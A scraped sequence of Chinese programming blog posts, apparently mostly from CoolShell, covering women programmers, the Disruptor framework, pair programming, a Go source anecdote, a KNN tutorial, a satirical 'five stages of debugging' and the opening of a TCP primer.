呵呵，午休结束了，回去干活～##### Gift – 当一名战士就是一支军队，那些软件不需要工程的时候请允许我为公正评价女程序员做一点贡献。以下文字所提到的关同学是一位女程序员。注：以下文字已发表于[http://blog.csdn.net/younggift/article/details/7166600]。* 最初的代码1994年，当我开始对编程感兴趣的时候，还没有软件蓝领这一说法，但是我已经有了后来软件蓝领流行起来以后的困惑。我第一次做的比较大的程序，是用GW-BASIC写的，没有IDE界面，需要按行号插入，黑底绿字的显示器，单个软驱倒腾用两张盘。 (感谢我们的导员刘春光老师每天中午借我用他的计算机) 要编的程序是自己想出来做着玩的，一个DOS界面下CGA显示模式，菜单方式的……班费管理程序。如同齐同学的那个定票系统，这个软件并没有实际应用，不过，它对我来说，比此后所有写的程序都更难。代码后来参加一个比赛的时候，打印了唯一的一份纸质版，打印纸抻开比我举起手还要高。我当时遇到了程序设计中的核心问题–大量的代码，复杂的逻辑。我当时使用了GW-BASIC提供的一个非BASIC的功能 gosub，类似于函数调用，它帮助我逃过了程序彻底混乱的厄运。后来当我学到模块化思想的时候，如遇故人。我毫不费力地就接受了这个观念，因为痛过，所以印象深刻。
后来经常见到有初学的同学函数写得超出两三屏，还很得意自己逻辑控制能力。我就在心里撇嘴，你那是还没受够罪。大量的代码，复杂的逻辑。软件工程给了我们某个答案，就是软件蓝领，它声称大量的人工、短期培训、重复地简单劳动，能够解决–以工程的方法–大量代码和复杂逻辑的问题。是的，我们这么干过，好几千看前就这样做。埃及盖金字塔，是没有起重机的，而是靠几千几万人力完成的；中国的古长城 (不是当代的) ，也没有等待现代电子计算机和通信技术的发展，而是靠万喜良们的双手堆砌出来的。那个时候，他们一定期待一种东西，可以用燃油作为动作，稳妥精确地运输沉重的材料。但是他们没有。因为是时代是父亲是民族选择我们，而不是反过来，所以很多时候很多事情都不能一蹴而就。有的时候，智力或自然的法则也参与限制。* 他们说，没有解析解在数学当中，有一种解题的方法得出的结论称为解析解。我们解一个方程，得到结果，如果我们所做的常见运算只需要 有限次，那么，这个结果就称为解析解。这是什么意思呢？就是说，你可以通过公式，只需要一个大式子，可能非常大，但是最终可以计算出结果，直接地。难道不都是这样么？不幸的是，还有一些方程，伟大的牛人数学家们告诉我们，有些方程就是不能通过公式求出来。而我们在工业生活中还需要求解。
数学家牛人们还是有办法的。他们创造了另一种方法，用猜测-比较-再猜测，大致这样的方法，逼近我们寻找的那个数。这些牛人们中的第一位就是著名的牛顿。但是，我们得到的是那个”数”，是整个方程中的一段，而且是粗糙的。精细的完全一致的解，可能永远也无法求得，我们得到的就是对于当前的应用”足够”精确   的个案。人类是多么地热爱形而上，热爱一次性解决所有问题啊。可是，数学牛人们说，有时候，你哭也没有用，就是不行。在程序设计中也是一样，只有工程方法，有人说，就是蓝领方法，才能解决大量代码和逻辑复杂的问题。如果没有燃油，没有热功当量，除了征服更多的奴隶，又有什么方法能够赢得自己的自由呢？但是，我们是否已经判定程序设计一定没有解析解，所以只能靠人力逼近？* 解析解我和李记者曾经对刘典同学怀有偏见，认为他(没有虽然技)技术极好 ，但是却从不注重软件中的工程，也不怎么注重合作。今天，关同学用事实给了我强烈的教育。她用事实告诉我：软件工程为什么有时可以忽略？因为有的程序员，她一个人可以完成超过100个程序员的。就像有的战士，一个人就是一支军队。刘典同学讲过他写数据库的程序用了编译原理生成代码，讲过写手机游戏的时候用虚拟机。前几天，我刚刚写了3千多的代码生成器，吐出来近6万行代码。这些   给我的印象也都没有今天这样深刻。
程序设计，是一种创造工作，就像写小说。与写小说不同的，你所创造的是一台机器，它可以做很多事，你甚至可以制造一台机器，它以代替你写作最终需要的   代码。在所有的计算机本科都开设了相关的课程，叫做编译原理。在一定程度上，这是一个解析解。* 关同学今天我CIAC的导师请大家吃饭，辛苦一年。导师本人想参加，我托包师弟说：不欢迎他。如果导师出现，今天稍微拘谨的场面，就可能令聚会完全不同。我们讨论了，我们吃午饭了，我们唱歌了，我们又吃晚饭了。刚开始吃晚饭没多久，包师弟说：2012的上半年，我们有一些任务要完成，相当于本年度完成任务的40倍工作量。他说：这些工作都是相似的。可是这些相似的工作如果不能抽象出其中相同的部分，就没有一点相似。我们人类看到的相似，对于构造代码而言，毫无用处。我看不出来相似。然后我想了几个方案，又都推翻–我在想从哪里抓那么多奴隶来，又用什么报偿他们，工程本身于他们何益。其实，同学们并非奴隶，必须保   证同学们有足够利益和受益，否则除了我自己，一个人也派不出来。我说：包师弟啊，你能不能别在吃饭的时候说这个，我都吃不下去了。我真的吃不下去了。焦虑。而且，从这以后，我真的几乎没吃啥。
奇迹时刻。关同学说：老师其实我想了，这些方案都是类似的。我说：啊？她说：所有的界面都可以……根据配置文件，new 出 一个 label来……是的，不熟悉关同学的，对女生能否写好程序有疑问的，请仔细看一下，她，不是他。而且，她也不必再解释这个方案，因为软件组可以全体解散，而剩下的工作，只需她一个人短时间就可以完成。这就是抽象的力量。她没有写GUI，而是解析配置文件生成了GUI；她绕过了令我头疼的C#如何表示GUI–这样就可以生成RC文件，在编译前，我考虑过的方案–而是在运行时，new   出所有的GUI控件来，相当于解释执行的。* 后来后来，全体软件组成员加入了硬件组，将承担下位机的代码。很好，我终于不用再讨厌他们用的IDE了，因为再也没有他们熟悉的VS什么的了。我们都开始进入   单片机或ARM的世界。后来，关同学对我的赞不绝口指出：这个方案是你告诉我的啊。我说：啊？她说：就是大仪网的时候，你告诉我blabla。我想起来了。不过，这仍不是我的方案，而是她的。一个方案之所以好(像这个，好到如此突出，以致你一眼就能看到，绝不可能错过，如果你看到了的话)，是因为它被应用在一个恰好合适的领域，恰好解决了一个难题。至于这个方案有多难有多容易，有多高科技，其实不是多重要。
关同学刚毕业的时候，我们在CIAC讨论一个框架，当时我说：这个倒是可以再抽象，不过我的方案有点耍赖了。关同学说：你是不是要用函数指针。是的。而且我非常欣慰了一下，因为学生优秀。黄同学当时认为：函数指针，也没啥难的啊。是的。函数指针一点也不难，能想到用函数指针解决这个问题，是一个高度。关同学在此刻想到了一个如此好的方案，所以接下来的半年，我们都不必那么焦虑了。这就是解析解。关的方案，不是减轻了劳动，不是像我以工程的方法、各种测试 (关今天还提出用MATLAB生成测试数据，也很好，后来给齐同学用上了) 来控制代码质量，用框架规范程序员的行为，这些都不是，关同学直接替代十来个人把40个用例生成了出来。代码质量如此一致和优秀，是由图灵保证的。* 后后记上午，与一位技术人员和一位经理谈话。我提到 通用的CMS > 定制的站点 > 使用CMS。那位技术人员不认可。我说：我刚刚说错了啊，我不是指复杂，而是指困难。那位技术人员blabla说，这不困难，只要如何如何即可。我说：其实我们也不必达成一致意见。我的意思不是说我们无法实现，我说的我会收更多的钱。争执略去，我同意那位技术人员的下面这个观点 (大致意思，我翻译过的) ，但是当时没有时间表达：这不是工作量，而是更高的高度。
是的，那不是更复杂，不是更消耗时间，甚至不是更困难。那就是更值钱。关同学用事实告诉我：一名战士完全可以是一支军队。没错。##### Zheng – 永不放弃程序员的工作从工作年限来说，我还不能算是一个程序员，因为现在还是一个大四的学生。但是我已经认定了程序员的这条道路。   高考结束后考虑专业问题，那时我的兴趣是文学，但是因为现实社会的关系和家庭经济的原因，我在毕业生收入排行榜上选择了平均收入最高的专业，软件工程。大一时懵懵懂懂，挂了很多科目，重修，从大二起开始拿奖学金，开始参加项目。因为大一评奖学金时看到自己排在倒数第二的位置，看到同班的同学参加各种软件比赛，我那时就开始思考，我在做什么？于是开始疯狂地写程序，重新学基础知识，认真上课，经常去看一些IT博客。在一家公司实习，我开始接触分布式系统的东西，那时leader让我一个人负责这一块，我就像实验的小白鼠的一样，但是我却感到很如鱼得水，我喜欢快速掌握一门新的领域，并学会总结。那是我真正意义上的在linux下的开发工作，学会了c网络编程，shell，python，hadoop,hive。那里的开发团队只有我一个女生，我见识到一个优秀的程序员所应该具备的一些素质，对技术热点的掌握，对产品的敏锐，不仅是代码，而且是融入产品的设计中，能提出作为一名开发者的意见。如果说作为一个女程序，我与他们不同之处，恐怕是得到更多的照顾，也学到很多。
实习两三个月后，我选择离职，在我看来，没有毕业的我实习就是一个新的课程，工作经验就像是旅程，经历的风景是阅历，也是财富。我选择了去一家做云存储服务的公司，在那边更深入地了解关于分布式系统的知识，而这些知识的获取是我自己间接得到的，并非公司培训。我刚到那里，发现还有另一个女程序，她很活泼，而且在项目开发中占据很重要的位置。从一个程序员的角度出发，我并不觉得会写代码是一件多么厉害的事，重要的是上手的能力，系统设计的能力，构架高性能的能力。而基础这些东西只要是一个智力水平相当的人，通过一定时间的磨练，都有可能掌握的。这家公司的资源很丰盛，我的任务并不多，更多的时间是自我学习和研究毕设课题。因为leader没有放手让我干活，干的只要是python脚本的一些开发，所以每次任务来的时候我都很快完成，一般leader上午给任务，下午下班前我就可以提交代码，剩下时间就做自己喜欢的c/c++的cli小应用和一些nosql开源项目。有时一个程序出错，就很偏执地想把错误找出来以后再收工，导致吃饭误点，这样的习惯对身体很不好，现在也正在努力改正中。工作经历差不多就是这些,不介意的话讲一下求职经历。我去面试时，很多面试官都会问我，女生做开发人员的问题。我想这本来就不是一个问题，作为一个人，你需要养家糊口，我也需要。我也有自己的职业规划，清楚知道自己想要什么。从懵懂到略知一二，到准备跳进火坑里塑造一个雷厉风行的新的自我。我一直相信人的某些性质是会变的，随着阅历，经历，实践的不同也产生质的改变。你现在看到的是一个弱女子，未必将来你不会看到一个女架构师。这些都是在进入hr面以后经常会和hr聊到的东西。这份工作能体现我的价值，我就来了。这就是我求职一路的态度。后来成功拿到一些公司的offer。
在未来的职场上，我也会不放弃程序员这份工作。学习的态度，认真负责的做事风格，即便我不是一个天才工程师，也可以成为优秀的程序员，不用刻意加“女”字。##### 女程序员们，为你们骄傲，祝你们2012年更上一层楼。**（另外，请各种网站、媒体，报刊，杂志，自由转载或是选取其中的故事做为你们的素材）**# 并发框架Disruptor译文作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢同事方腾飞投递本文）**Martin Fowler在自己网站上写了一篇LMAX架构的文章，在文章中他介绍了LMAX是一种新型零售金融交易平台，它能够以很低的延迟产生大量交易。这个系统是建立在JVM平台上，其核心是一个业务逻辑处理器，它能够在一个线程里每秒处理6百万订单。业务逻辑处理器完全是运行在内存中，使用事件源驱动方式。业务逻辑处理器的核心是Disruptor。Disruptor它是一个开源的并发框架，并获得2011 Duke’s 程序框架创新奖，能够在无锁的情况下实现网络的Queue并发操作。本文是Disruptor官网中发布的文章的译文（现在被移到了GitHub）。
#### **剖析Disruptor:为什么会这么快*** 剖析Disruptor:为什么会这么快？(一)锁的缺点* 剖析Disruptor:为什么会这么快？(二)神奇的缓存行填充* 剖析Disruptor:为什么会这么快？(三)伪共享")* 剖析Disruptor:为什么会这么快？(四)揭秘内存屏障揭秘内存屏障")#### Disruptor如何工作和使用* 如何使用Disruptor（一）Ringbuffer的特别之处* 如何使用Disruptor（二）如何从Ringbuffer读取* 如何使用Disruptor（三）写入Ringbuffer* Disruptor(无锁并发框架)-发布-发布")* LMAX Disruptor——一个高性能、低延迟且简单的框架* Disruptor Wizard已死，Disruptor Wizard永存！* Disruptor 2.0更新摘要* 线程间共享数据不需要竞争#### Disruptor的应用* LMAX的架构* 通过Axon和Disruptor处理1M tps（全文完）# 结对编程的利与弊作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
!cccpairprogramming结对编程(Pair- Programming)可能是近年来最为流行的编程方式。所谓结对编程，也就是两个人写一个程序，其中，一个人叫Driver，另一个人叫Observer，Driver在编程代码，而Observer在旁边实时查看Driver的代码，并帮助Driver编程。并且，Driver和Observer在一起时可以相互讨论，有效地避免了闭门造车，并可以减少后期的code review时间，以及代码的学习成本。有实验证明，平均下来，结对编程所花费的时候比单人编程增加了10%，但也会比单人编程减少15%的代码BUG。如果再算上后期代码的维护和学习成本，结对编程比单人编程更有效率，还更为节省成本。无论是对开发团队还是对于Business，结对编程都会是非常不错的Programming Practice。**下面是一些结对编程的优点：**1. 程序员互相帮助，互相教对方，可能得到能力上的互补。   2. 可以让编程环境有效地贯彻Design。   3. 增强代码和产品质量，并有效的减少BUG。   4. 降低学习成本。一边编程，一边共享知识和经验，有效地在实践中进行学习。   5. 在编程中，相互讨论，可能更快更有效地解决问题。
**   当然，结队编程也会有一些不好的地方：**1. 对于有不同习惯的编程人员，可以在起工作会产生麻烦，甚至矛盾。   2. 有时候，程序员们会对一个问题各执己见（代码风格可能会是引发技术人员口水战的地方），争吵不休，反而产生重大内耗。   3. 两个人在一起工作可能会出现工作精力不能集中的情况。程序员可能会交谈一些与工作无关的事情，反而分散注意力，导致效率比单人更为低下。   4. 结对编程可能让程序员们相互学习得更快。有些时候，学习对方的长处，可能会和程序员们在起滋生不良气氛一样快。比如，合伙应付工作，敷衍项目。   5. 面对新手，有经验的老手可能会觉得非常的烦躁。不合适的沟通会导到团队的不和谐。   6. 新手在面对有经验的老手时会显得非常的紧张和不安，甚至出现害怕焦虑的的精神状态，从而总是出现低级错误，而老手站在他们后面不停地指责他们导致他们更加紧张，出现恶性循环。最终导致项目进展效率低下，并且团队貌合神离。   7. 有经验的人更喜欢单兵作战，找个人来站在他背后看着他可能会让他感到非常的不爽，最终导致编程时受到情绪影响，反而出现反作用。是否使用结对编程，需要具体问题具体分析，不可盲目。任何事物都有他的好与坏，结对编程也不例外，只有知道了好与坏，你才能更好的利用它。
最后，请记住，人是一种非常复杂的动物，他们的缺点和内心的阴暗面可能会比你想像得还要糟糕，而这些东西是可以让一切事物失败的。所以，正如《人件》所说，人才是软件开发中最核心，也是最需要花时间去关注的事情。# 两个教程：Socket和HTML5作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn给大家介绍两个教程，一个是关于Socket编程的，一个是关于HTML5的。关于Socket，相信大家都知道这个是用来做TCP/IP网络编程的，其由FreeBSD引入，现在，只要你相做网络编程，你必然会使用到它。这里有一个叫 **Beej’s Guide to Network Programming 的网站**，非常不错的一个教程。在其主页上显示有中译版，不过很可惜，打不开。好像网络有很多转载，你可以Google一下。另一个是关于HTML5的众多标签，大家可以访问这个叫做“ **HTML5 Peeks, Pokes and Pointers**”的网站，其就像一个速查手册一样，你可要查阅HTML5的那些BT的tag，比如：多媒体，画布，地理，表单，等等。希望大家喜欢，不妨你也说说你知道的相关的一些教程。
*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 一个“精湛”的JS程序作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是一个很“精湛”的JS程序：这个JS文件中“精湛”之处在于，其只有一行代码，如下所示：下面这个贴子讨论了这个JS文件：大家都在猜测为什么那个程序员要这么干，下面是一些猜测：1. 网友superjer说：这是一个伟大的创造，解决了你的键盘“.”键损坏的情况。   2. 网友Heron说：这是从Character Map上拷贝粘贴下来的。   3. 网友mfah说：这是世界上第一个用C来包装Javascript的示例。   4. 网友djork说：我是一个用手机编程的人，这个方法可以让人在手机上更容易输入我的代码。   5. 网友PSWorx说：可能他们想把document.write作为一个回调函数，但直接把document.write传进去不行。   6. 还有一个网友说：这么做或者可以阻止网页上的广告阻截器。呵呵，看来，“超级天才”和“极端愚蠢”可能只是一线之差，只有写这段程序的那个程序员才知道为什么要这么干了。也许，他的键盘的那个键真的是坏了也不一定。
# Go语言源码的一个改动作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2009年11月11日，光棍节，Google发布了Go语言，马上，就有网友在http://code.google.com/p/go/上找到了一个Go语言包文件操作源码/src/pkg/os/file.go文件的一个最新改动。这个改动的作者就是那个大名鼎鼎的Unix之父Ken Thompson（看看人家，都这么老了，还在写程序，佩服佩服，真是顶级程序员啊——《程序员的八个级别》），而这个改动的Log Message如下所示（把屏抓下来，以免以后某日被放到墙外或是google.com数据丢失或是Google公司倒闭）Spell it with an “e”!spell it with an e这是一个很著名的典故，要知道这个典故，你需要知道两件事，一个是Ken Thompson的经典语录，一个是Unix的系统调用。关于Ken Thompson的经典语录，你可以在wikipdia上的Ken Thompson词条中找到，这个事情是这样的。> Ken Thompson was once asked what he would do differently if he were > redesigning the UNIX system. His reply: “ **I’d spell creat with an e.** ” > （Ken Thompson有一次在被问到——如果他可以重新设计Unix系统，他会做些什么不同的事？而他回答到：“我会把“creat”多拼一个e”）
“I’d spell creat with an e”，也就是说，他会把creat这个单词拼成 **creat** **e** ，而不是creat。为什么是creat呢，这需要我们来看一下creat这个系统调用，你可以在Unix或Linux下简单地man creat你就可以知道，这个系统调用连带其某些参数，如： **O_CREAT** ，都是一个少了“e”的create。（Unix下的有很多东西都是简写，如：usr，gp，ls，mv，ps，满大街的都是缩写）看看这个改动的diff——这个diff只有一行，第65行，抓屏如下（理由同上）!spell it with e  diff40年后的今天，Ken Thompson参与Go语言设计，于是，他提交了这个改动，也算是圆了他的愿望，从这点看来，Ken Thompson把Go语言看得和Unix一样重啊。难道Go语言也会像Unix一样成为另一个传奇？（Unix传奇 上篇，下篇）（全文完）# 哥是玩程序的作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面一组有趣的Web示例，这些示例使用Web的一些很“土”控件做出一些很有趣的玩意儿。原来，编程是可以用来玩的，看看这些玩程序的人搞出的这些有意思的玩意，简直是玩得太有意思了。不过，请注意，这些东西只能使用Chrome打开，不然，你看不到相关的效果。
**用滚动条做的时间**，下面的抓图只显示了时和分，后面还有不停跳动的秒。可以在IE，Fireforx和Chrome中查看。!用滚动条做的时间**用CheckBox做成一个水滴效果**，这个示例的整个页面由Checkbox构成，你用鼠标点一下其中一个CheckBox，你会看到一个巨大的水滴滴了下去。Chrome中效果更好。!用checkbox做的雨滴效果**一个用滚动条做的扭动效果**，页面打开你可以看到一排滚动条，用鼠标快速地横向滑动，你会看到滚动条开始跟着你的鼠标扭动。太BT了。请使用Chrome查看。!一个可以扭曲的滚动条**用CheckBox做的一个音阶**，这个效果还是只能用Chrome查看。随机地点一下其中的Checkbox，于是程序会根据你所点的顺序开始演奏一些“滴滴嘟嘟”的声音，很有意思。!用CheckBox作的音阶**用滚动条做的一个波浪效果**，还是用鼠标触发，把鼠标放在这一排滚动条中上下移动，你会发现滚动条会跟着你的鼠标形成波浪的效果。还是只能在Chrome中查看。!用滚动条做的波形the389.com这个网站成了这些乱七八糟的小玩意的试验地，上面还有其它一些这些类似的小玩意。呵呵，不要迷恋哥，哥只是玩程序。
另外，在Chrome的试验田，你还可以看到很多这样的东西，甚至更弦的东西。只不过，Chrome试验田的那些小玩意看着不够“土”，所以效果不够好。呵呵。(全文完)# K Nearest Neighbor 算法作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnK Nearest Neighbor算法又叫KNN算法，这个算法是机器学习里面一个比较经典的算法， 总体来说KNN算法是相对比较容易理解的算法。其中的K表示最接近自己的K个数据样本。KNN算法和K-Means算法不同的是，K-Means算法用来聚类，用来判断哪些东西是一个比较相近的类型，而KNN算法是用来做归类的，也就是说，有一个样本空间里的样本分成很几个类型，然后，给定一个待分类的数据，通过计算接近自己最近的K个样本来判断这个待分类数据属于哪个分类。 **你可以简单的理解为由那离自己最近的K个点来投票决定待分类数据归为哪一类** 。Wikipedia上的KNN词条中有一个比较经典的图如下：从上图中我们可以看到，图中的有两个类型的样本数据，一类是蓝色的正方形，另一类是红色的三角形。而那个绿色的圆形是我们待分类的数据。
* 如果K=3，那么离绿色点最近的有2个红色三角形和1个蓝色的正方形，这3个点投票，于是绿色的这个待分类点属于红色的三角形。* 如果K=5，那么离绿色点最近的有2个红色三角形和3个蓝色的正方形，这5个点投票，于是绿色的这个待分类点属于蓝色的正方形。我们可以看到，机器学习的本质—— **是基于一种数据统计的方法** ！那么，这个算法有什么用呢？我们来看几个示例。目录* 产品质量判断   * 预测   * 插值，平滑曲线   * 后记#### 产品质量判断假设我们需要判断纸巾的品质好坏，纸巾的品质好坏可以抽像出两个向量，一个是“酸腐蚀的时间”，一个是“能承受的压强”。如果我们的样本空间如下：（所谓样本空间，又叫Training Data，也就是用于机器学习的数据）**向量X1****耐酸时间（秒）**|**向量X2****圧强(公斤/平方米)**|**品质Y**---|---|---7|7|坏7|4|坏3|4|好1|4|好那么，如果 X1 = 3 和 X2 = 7， 这个毛巾的品质是什么呢？这里就可以用到KNN算法来判断了。假设K=3，K应该是一个奇数，这样可以保证不会有平票，下面是我们计算（3，7）到所有点的距离。（关于那些距离公式，可以参看K-Means算法中的距离公式）
**向量X1****耐酸时间（秒）**|**向量X2****圧强(公斤/平方米)**|**计算到 (3, 7)的距离**|**向量Y**---|---|---|---7|7|****|  坏7|4|****|  N/A3|4|****|  好1|4|****|  好所以，最后的投票，好的有2票，坏的有1票，最终需要测试的（3，7）是合格品。（当然，你还可以使用权重——可以把距离值做为权重，越近的权重越大，这样可能会更准确一些）**注：示例来自这里，K-NearestNeighbors Excel表格下载**#### 预测假设我们有下面一组数据，假设X是流逝的秒数，Y值是随时间变换的一个数值（你可以想像是股票值）那么，当时间是6.5秒的时候，Y值会是多少呢？我们可以用KNN算法来预测之。这里，让我们假设K=2，于是我们可以计算所有X点到6.5的距离，如：X=5.1，距离是 | 6.5 – 5.1 | = 1.4， X = 1.2 那么距离是 | 6.5 – 1.2 | = 5.3 。于是我们得到下面的表：注意，上图中因为K=2，所以得到X=4 和 X =5.1的点最近，得到的Y的值分别为27和8，在这种情况下，我们可以简单的使用平均值来计算：
于是，最终预测的数值为：17.5**注：示例来自这里，KNN_TimeSeries Excel表格下载**#### 插值，平滑曲线KNN算法还可以用来做平滑曲线用，这个用法比较另类。假如我们的样本数据如下（和上面的一样）：要平滑这些点，我们需要在其中插入一些值，比如我们用步长为0.1开始插值，从0到6开始，计算到所有X点的距离（绝对值），下图给出了从0到0.5 的数据：下图给出了从2.5到3.5插入的11个值，然后计算他们到各个X的距离，假值K=4，那么我们就用最近4个X的Y值，然后求平均值，得到下面的表：于是可以从0.0, 0.1, 0.2, 0.3 …. 1.1, 1.2, 1.3…..3.1, 3.2…..5.8, 5.9, 6.0 一个大表，跟据K的取值不同，得到下面的图：|---|---    |**注：示例来自这里，KNN_Smoothing Excel表格下载**#### 后记最后，我想再多说两个事，1） 一个是机器学习，算法基本上都比较简单，最难的是数学建模，把那些业务中的特性抽象成向量的过程，另一个是选取适合模型的数据样本。这两个事都不是简单的事。算法反而是比较简单的事。
2）对于KNN算法中找到离自己最近的K个点，是一个很经典的算法面试题，需要使用到的数据结构是“最大堆——Max Heap”，一种二叉树。你可以看看相关的算法。（全文完）# Fix Bug的五个阶段作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面的文章和《各种流行的编程方式》有异曲同工，请你不要理解错了。 **本文来源 "THE FIVE STAGES OF DEBUGGING")** ，翻译如下：——————————————————一个非常严重和困难的bug，能够成就一个饱经沧桑深受压力的有经验的专业程序员的职业生涯。经受这种考验的创伤程度，相当你受到了一次严重的身体伤害，离婚，或是家庭成为的离世。研究人员在研究了计算机编程心理学后，得出了一个程序员们在解决一个困难的bug时的心路里程。这些不同的境界，很像为大众所知的Kübler-Ross Stages of Grief（这个模型描述了人对待哀伤与灾难过程中的5个独立阶段（否认，愤怒，耍赖，抑郁，接受）。绝症患者被认为会经历这些阶段），而且原因都很相似。就好像死亡所伴随的悲伤一样，fix一个bug是一个过程其初始化了一个事件，一开始是拒绝相信，其造就了你苦闷的情绪并开始逐步影响你的心智。这种苦闷的情结果会让你纠结要努力忍受，最终会你会找到一个满意的结果。
了解下面这几个bug-fixing的阶段，会让我们更好的生存下来，并持之以恒，最终带来……关闭我们所有的bug的结果。## 第一阶段：抵触本阶段的状态: 多疑 Skeptical. 生气 Offended. 易怒 Petulant.**1\. 不理睬**也许这个bug会安静地离开。**2\. 标记上“不是bug”**也许这是用户的错，或是本地配置有问题。是的，我确信就是那样，一会就会好的。**3\. 就是一次小故障**我想这就是一次小故障，很奇怪地发生了一次，它不会再发生的，虽然没有搞清楚是为什么发生了，不过这就好像我们的数据库，网格，浏览器或别的什么打了几个嗝一样。一会就会好的，我确信。**4\. 躲藏.**我要休几天病假，也许他们会把这个bug转给别人的。**5\. 标记为“修改需求中”**你看，我是按照需求实现的。如果你们想要改这个行为和UI，就一定要修改需求。也许他们会决定就这样了。**6\. 需要更多的信息**我不能确定这是一个bug，除非我能在错误日志中看到一条特定的报错信息。**7\. 转给其他人**我调查这个bug中看到了其它模块中我看不懂的数据，问题很大。我应该把这个bug转给开发那个模块的人。我可以在我的模块中检查一下那个边边角角的情况，但是正确的fix应该是在别人的模块中。反正那个在别的国家，我见不着他。
## 第二阶段：接受本阶段的状态: 认命 Resigned. 被打击 Defeated. 被激怒 Annoyed.**1\. 接受现实**行了，行了，行了！这是我的bug，我会修正它的。**2\. 把这个bug放到最后**也许，我可以在我需要fix这个bug之前找到一个新的工作。**3\. 和你的经理讨价还价**好的，你看，我可以正确地fix这个问题，不过我需要一个月。也就是说，我可以给这个问题贴个创可贴，那不会真正的解决它，但是我们可以避免用户的抱怨，这可以为我们赢得几天的时间。**4\. 为这个bug标记一个无耻的时间**上帝啊，我希望这时间够了。## 第三阶段： 投入和沮丧本阶段的状态: 眼花 Giddy. 头晕 Light-headed. 紧张 Nauseous.**1\. 开始调查**我能搞定它，我能搞定它！只需要小小的调整一下，小小的关注一下，多一点咖啡因，再加上一点时间，我能搞定它。**2\. 迷惘**Shit. 这太扯了。我居然没有一点进展。这代码真是乱。这样的代码居然能编译和运行，真TMD的神奇，我有机会能搞清楚它什么不正常吗？**3\. 再次躲藏**你看，很对不起。我不得不要去切除我的阑尾。再一次，是的，既然你提到了它，我的确有两个阑尾。现在我一个也没有了，你高兴了吧？。
**4\. 犯贱**好吧，总之，你到底期望什么？想让我在一个没有高级调试器的环境下改这个BUG。我是什么？千里眼吗？我在我的Commodore 64上一个更好的调试器！**5\. 瞎搞**看看我试试这么改？Kao，这样不行。要不然这样搞？也不行。那么那样搞呢？Shit，居然变得更糟了。**6\. 绝望**我不可能fix这个bug了。我是个糟糕的程序员。我太笨了。我在这个满是聪明人的地方干什么？迟早他们会知道我的能力太差，那时我就玩完了，在这也混不下去了。**7.耻辱**我的经理问我为什么我用了一个月的时候来fix这个只需要两天就可以解决的bug？老实说，我不知道怎么去读日志信息，我搞坏了我们的编译脚本。现在，我不敢去让别人来帮我，因为这样只会让我显得更愚蠢。**8\. 恐慌！**这事变得比我相像的要复杂！而我开始觉得复杂的事变得简单……而我觉得简单的事变成需要重定半打的类。为什么我以前在我的经理前拍着胸说我可以搞定这个事？**9\. 通宵工作，远离朋友和家人**(语无论次的喃喃自语，一阵一阵地大声咒骂)## 第四个阶段：愚蠢的快感本阶段的状态: 感恩 Grateful. 安心 Relieved. 极端地自我欣赏 Awfully Impressed with Yourself.
**1\. 醒悟**哦！我终于明白怎么搞定它了……**2\. 写正确的代码**我真NB，我是编码机器！**3\. 测试**牛！通过一个测试。真牛！又通过一个测试了。靠！有测试失败了。这是为什么……**4\. 隐藏测试失败**反正这完全是一个不重要的测试案例。没有人会检查它，这个测试真是毫无意义。**5\. 提交代码**我太牛了，厨房里有个馅饼可以庆祝一下吗？**6\. 关闭 bug.**我听说那里有个馅饼可以庆祝一下## 第五个阶段： 与“完成”肉搏本阶段的状态: 焦燥不安 Twitchy. 神经过敏 Nervous. 迷信 Superstitious.**1\. 有人reopen了这个 Bug**真的？他们发现了你引入了另一个bug？ Shit – 那只是一个不重要的案例永远不会发生的。**2\. 修正以前的修正**是的，我甚至检查了员工的年龄是一个虚数的情况，就是为了防止出错。**3\. 关闭 bug**是的，贱货，你被关闭了。全部都关了，再也不用心烦了。**4\. 发誓以后再也不干这种事了****5\. 大家都意识到你现在是那个模块的专家了**哦，不！现在他们又给了我三个那个模块的新bug
没关系，现在你只需要GOTO 第一个阶段。此外，作为一个工作中的程序员，你会永远经历这些烂事，直到你——死亡，退休，或是被升到管理层。（全文完）# TCP 的那些事儿（上）作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnTCP是一个巨复杂的协议，因为他要解决很多问题，而这些问题又带出了很多子问题和阴暗面。所以学习TCP本身是个比较痛苦的过程，但对于学习的过程却能让人有很多收获。关于TCP这个协议的细节，我还是推荐你去看W.Richard Stevens的《TCP/IP 详解 卷1：协议》（当然，你也可以去读一下RFC793以及后面N多的RFC）。另外，本文我会使用英文术语，这样方便你通过这些英文关键词来查找相关的技术文档。之所以想写这篇文章，目的有三个，* 一个是想锻炼一下自己是否可以用简单的篇幅把这么复杂的TCP协议描清楚的能力。   * 另一个是觉得现在的好多程序员基本上不会认认真真地读本书，喜欢快餐文化，所以，希望这篇快餐文章可以让你对TCP这个古典技术有所了解，并能体会到软件设计中的种种难处。并且你可以从中有一些软件设计上的收获。   * 最重要的希望这些基础知识可以让你搞清很多以前一些似是而非的东西，并且你能意识到基础的重要。
所以，本文不会面面俱到，只是对TCP协议、算法和原理的科普。我本来只想写一个篇幅的文章的，但是TCP真TMD的复杂，比C++复杂多了，这30多年来，各种优化变种争论和修改。所以，写着写着就发现只有砍成两篇。* 上篇中，主要向你介绍TCP协议的定义和丢包时的重传机制。   * 下篇中，重点介绍TCP的流迭、拥塞处理。废话少说，首先，我们需要知道TCP在网络OSI的七层模型中的第四层——Transport层，IP在第三层——Network层，ARP在第二层——Data Link层，在第二层上的数据，我们叫Frame，在第三层上的数据叫Packet，第四层的数据叫Segment。首先，我们需要知道，我们程序的数据首先会打到TCP的Segment中，然后TCP的Segment会打到IP的Packet中，然后再打到以太网Ethernet的Frame中，传到对端后，各个层解析自己的协议，然后把数据交给更高层的协议处理。目录* TCP头格式   * TCP的状态机   * 数据传输中的Sequence Number   * TCP重传机制     * 超时重传机制     * 快速重传机制     * SACK 方法     * Duplicate SACK – 重复收到数据的问题
